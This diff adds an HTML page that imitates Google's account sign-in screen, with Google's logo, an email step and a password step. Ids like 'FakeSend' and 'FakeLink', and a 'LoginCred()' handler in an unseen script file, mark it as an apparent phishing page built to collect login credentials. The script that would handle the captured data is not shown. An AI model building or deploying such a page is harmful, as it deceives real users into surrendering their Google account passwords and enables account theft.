@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="../Resources/CSS/style.css">
+</head>
+<body>
+  <div class="login-box">
+    <img src="../Resources/PHOTO/Google_img.png" alt="Google Logo" />
+    <h1>Log in</h1>
+    <p id="subtitle">Use your Google Account.</p>
+    <a id="FakeInfo" href="#">Find out more</a>
+      <div id="emailStep">
+        <input type="email" id="email" placeholder="Email or telephone" required />
+        <button id="FakeSend1" class="FakeSend" type="button" onclick="goToPassword()">After</button>
+        <a id="FakeLink1" class="FakeLink" href="#">Forgot your email address?</a>
+      </div>
+      <div id="passwordStep" style="display: none;">
+        <input type="password" id="password" placeholder="Enter your password" required />
+        <button id="FakeSend2" class="FakeSend" type="submit" onclick="LoginCred()">Log in</button>
+        <a id="FakeLink2" class="FakeLink" href="#">Forgot your password?</a>
+      </div>
+  </div>
+</body>
+<script src="../Resources/JS/Main.js"></script>
+</html>
